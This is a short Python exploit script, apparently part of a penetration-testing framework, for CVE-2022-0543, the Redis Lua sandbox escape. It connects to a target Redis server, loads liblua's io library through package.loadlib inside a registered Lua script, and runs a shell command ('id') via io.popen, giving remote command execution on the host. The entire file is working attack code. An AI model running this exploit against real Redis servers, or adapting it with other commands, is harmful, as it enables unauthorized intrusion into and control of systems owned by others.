from BaseExploit import *
import redis

def CVE_2022_0543(host, port):
    pool = redis.ConnectionPool(host=host,port=port, decode_responses=True)
    r = redis.Redis(connection_pool=pool)

    lua_script = """local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); 
                    local io = io_l(); 
                    local f = io.popen("id", "r"); 
                    local res = f:read("*a"); 
                    f:close(); 
                    return res"""

    cmd = r.register_script(lua_script)
    res = cmd()
    # print(res)

Exploit(CVE_2022_0543, args.host, args.port)()